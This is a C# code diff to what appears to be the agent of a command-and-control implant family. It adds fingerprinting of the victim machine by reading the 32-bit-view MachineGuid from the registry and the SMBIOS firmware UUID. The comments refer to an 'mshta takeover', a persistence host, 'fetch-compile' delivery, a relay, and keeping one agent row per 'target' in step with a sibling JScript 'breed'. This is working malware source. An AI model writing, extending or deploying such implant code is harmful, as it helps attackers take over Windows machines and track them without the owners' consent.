@@ -1,7 +1,6 @@
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using Microsoft.Win32;
 
 namespace CSharpAgent
 {
@@ -17,16 +16,17 @@ namespace CSharpAgent
 
         internal static string[][] Build()
         {
-            var guid = "";
-            try
-            {
-                guid = (Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography",
-                    "MachineGuid", "") as string ?? "").ToLowerInvariant();
-            }
-            catch { }
-            // The machine UUID is nullable: a malformed/absent MachineGuid is NOT replaced
-            // with a random GUID (that fabricated a fresh phantom identity per process) —
-            // the header is simply omitted and the relay treats the agent as identity-less.
+            // CANONICAL machine uuid = the MachineGuid an x86 process sees (the Wow6432Node
+            // copy on a 64-bit host) — that is the only view the JScript breed can reach, so
+            // it is the view every breed must use. MachineGuid IS bitness-visible: HKLM\SOFTWARE
+            // redirects for 32-bit readers, and the two copies hold DIFFERENT GUIDs on many
+            // machines, so a breed that follows its host's bitness (Registry.GetValue / default
+            // view) mints a second agent row on the same target. Chain, identical to the
+            // JScript agent's: 32-bit-view MachineGuid → SMBIOS UUID → omit (nullable — never
+            // a random GUID, never a placeholder; the relay reads a missing header as
+            // identity-less).
+            var guid = MachineGuid32View();
+            if (!LooksLikeGuid(guid)) guid = SmbiosUuid();
             if (!LooksLikeGuid(guid)) guid = "";
 
             var machineArch = MachineArch();
@@ -75,6 +75,105 @@ namespace CSharpAgent
                 else if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) return false;
             }
             return true;
+        }
+
+        /// <summary>MachineGuid read through the pinned 32-bit registry view — identical to what
+        /// the x86-re-hosted JScript host's RegRead returns, regardless of which bitness hosts
+        /// THIS assembly (x86 mshta takeover vs a 64-bit persistence/WMI host). On a 32-bit OS
+        /// the flag is a no-op (single view). "" when unreadable.</summary>
+        private static string MachineGuid32View()
+        {
+            try
+            {
+                const uint rrfRegSz = 0x02;
+                const uint rrfSubkeyWow6432 = 0x00020000;
+                var hkeyLocalMachine = new IntPtr(0x80000002L); // no sign extension on x64
+                var data = new byte[128];
+                var bytes = (uint)data.Length;
+                uint type;
+                if (NativeImports.RegGetValue(hkeyLocalMachine,
+                        @"SOFTWARE\Microsoft\Cryptography", "MachineGuid",
+                        rrfRegSz | rrfSubkeyWow6432, out type, data, ref bytes) != 0)
+                    return "";
+                var value = System.Text.Encoding.Unicode.GetString(data, 0, (int)bytes);
+                var nul = value.IndexOf('\0');
+                if (nul >= 0) value = value.Substring(0, nul);
+                return value.ToLowerInvariant();
+            }
+            catch { }
+            return "";
+        }
+
+        /// <summary>SMBIOS type-1 System UUID via GetSystemFirmwareTable('RSMB') — byte-for-byte
+        /// the string Win32_ComputerSystemProduct.UUID returns, which is the JScript agent's
+        /// fallback source. No WMI dependency (the fetch-compile ships a single System
+        /// reference). "" when the tables carry no usable type-1 structure.</summary>
+        private static string SmbiosUuid()
+        {
+            try
+            {
+                const uint rsmb = 0x52534D42;
+                var size = NativeImports.GetSystemFirmwareTable(rsmb, 0, null, 0);
+                if (size < 30) return ""; // 8-byte header + a minimal type-1 with the UUID
+                var raw = new byte[size];
+                if (NativeImports.GetSystemFirmwareTable(rsmb, 0, raw, size) != size) return "";
+
+                var major = raw[1];
+                var minor = raw[2];
+                var length = (uint)(raw[4] | (raw[5] << 8) | (raw[6] << 16) | (raw[7] << 24));
+                if (length > size - 8) length = size - 8;
+
+                var pos = 0u;
+                while (pos + 4 <= length)
+                {
+                    var type = raw[8 + pos];
+                    var structLength = (uint)raw[8 + pos + 1];
+                    if (structLength < 4 || pos + structLength > length) return "";
+                    // Type 1 (System Information): the UUID sits at STRUCTURE offset 0x08
+                    // (spec offsets include the 4-byte type/length/handle header), so a
+                    // structure carrying the full 16 bytes must span at least 0x18 bytes.
+                    // Real tables are 0x1B/0x1C long; some omit trailing string-index fields.
+                    if (type == 1 && structLength >= 0x18)
+                        return FormatSmbiosUuid(raw, (int)(8 + pos + 8), major, minor);
+                    // Skip the formatted area, then the double-NUL-terminated string set.
+                    pos += structLength;
+                    var nulRun = 0;
+                    while (pos < length)
+                    {
+                        var b = raw[8 + pos];
+                        pos++;
+                        if (b == 0) { nulRun++; if (nulRun == 2) break; }
+                        else nulRun = 0;
+                    }
+                }
+            }
+            catch { }
+            return "";
+        }
+
+        private static string FormatSmbiosUuid(byte[] raw, int offset, int major, int minor)
+        {
+            var uuid = new byte[16];
+            Array.Copy(raw, offset, uuid, 0, 16);
+            // SMBIOS ≥ 2.6 stores the first three fields little-endian; the canonical string
+            // form (and Win32_ComputerSystemProduct.UUID) byte-swaps them back. Older tables
+            // are already in string order.
+            if (major > 2 || (major == 2 && minor >= 6))
+            {
+                Array.Reverse(uuid, 0, 4);
+                Array.Reverse(uuid, 4, 2);
+                Array.Reverse(uuid, 6, 2);
+            }
+            var hex = "0123456789abcdef";
+            var chars = new char[36];
+            var ci = 0;
+            for (var i = 0; i < 16; i++)
+            {
+                if (i == 4 || i == 6 || i == 8 || i == 10) chars[ci++] = '-';
+                chars[ci++] = hex[uuid[i] >> 4];
+                chars[ci++] = hex[uuid[i] & 0x0F];
+            }
+            return new string(chars);
         }
 
         // Machine arch via GetNativeSystemInfo — WOW64-proof (the JScript agent takes the WMI
